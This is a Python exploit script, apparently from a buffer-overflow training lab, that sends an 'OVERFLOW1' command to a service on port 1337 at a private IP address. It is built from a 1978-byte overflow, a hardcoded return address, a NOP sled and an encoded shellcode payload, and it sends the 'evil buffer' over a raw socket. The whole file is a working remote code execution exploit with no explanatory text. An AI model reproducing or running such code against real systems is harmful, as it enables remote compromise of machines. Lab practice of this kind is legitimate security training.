import socket

ip = "192.168.225.105"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
buf =  b""
buf += b"\xdb\xcf\xbd\x71\xce\x71\xae\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\xb3\xca\x93"
buf += b"\x5b\xcf\x3b\xd1\xa4\x2f\xbc\xb6\x2d\xca\x8d\xf6\x4a"
buf += b"\x9f\xbe\xc6\x19\xcd\x32\xac\x4c\xe5\xc1\xc0\x58\x0a"
buf += b"\x61\x6e\xbf\x25\x72\xc3\x83\x24\xf0\x1e\xd0\x86\xc9"
buf += b"\xd0\x25\xc7\x0e\x0c\xc7\x95\xc7\x5a\x7a\x09\x63\x16"
buf += b"\x47\xa2\x3f\xb6\xcf\x57\xf7\xb9\xfe\xc6\x83\xe3\x20"
buf += b"\xe9\x40\x98\x68\xf1\x85\xa5\x23\x8a\x7e\x51\xb2\x5a"
buf += b"\x4f\x9a\x19\xa3\x7f\x69\x63\xe4\xb8\x92\x16\x1c\xbb"
buf += b"\x2f\x21\xdb\xc1\xeb\xa4\xff\x62\x7f\x1e\xdb\x93\xac"
buf += b"\xf9\xa8\x98\x19\x8d\xf6\xbc\x9c\x42\x8d\xb9\x15\x65"
buf += b"\x41\x48\x6d\x42\x45\x10\x35\xeb\xdc\xfc\x98\x14\x3e"
buf += b"\x5f\x44\xb1\x35\x72\x91\xc8\x14\x1b\x56\xe1\xa6\xdb"
buf += b"\xf0\x72\xd5\xe9\x5f\x29\x71\x42\x17\xf7\x86\xa5\x02"
buf += b"\x4f\x18\x58\xad\xb0\x31\x9f\xf9\xe0\x29\x36\x82\x6a"
buf += b"\xa9\xb7\x57\x3c\xf9\x17\x08\xfd\xa9\xd7\xf8\x95\xa3"
buf += b"\xd7\x27\x85\xcc\x3d\x40\x2c\x37\xd6\xaf\x19\xd6\xf8"
buf += b"\x58\x58\x18\x14\xc5\xd5\xfe\x7c\xe5\xb3\xa9\xe8\x9c"
buf += b"\x99\x21\x88\x61\x34\x4c\x8a\xea\xbb\xb1\x45\x1b\xb1"
buf += b"\xa1\x32\xeb\x8c\x9b\x95\xf4\x3a\xb3\x7a\x66\xa1\x43"
buf += b"\xf4\x9b\x7e\x14\x51\x6d\x77\xf0\x4f\xd4\x21\xe6\x8d"
buf += b"\x80\x0a\xa2\x49\x71\x94\x2b\x1f\xcd\xb2\x3b\xd9\xce"
buf += b"\xfe\x6f\xb5\x98\xa8\xd9\x73\x73\x1b\xb3\x2d\x28\xf5"
buf += b"\x53\xab\x02\xc6\x25\xb4\x4e\xb0\xc9\x05\x27\x85\xf6"
buf += b"\xaa\xaf\x01\x8f\xd6\x4f\xed\x5a\x53\x6f\x0c\x4e\xae"
buf += b"\x18\x89\x1b\x13\x45\x2a\xf6\x50\x70\xa9\xf2\x28\x87"
buf += b"\xb1\x77\x2c\xc3\x75\x64\x5c\x5c\x10\x8a\xf3\x5d\x31"
postfix = ""

buffer = prefix + overflow + retn + padding + buf + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
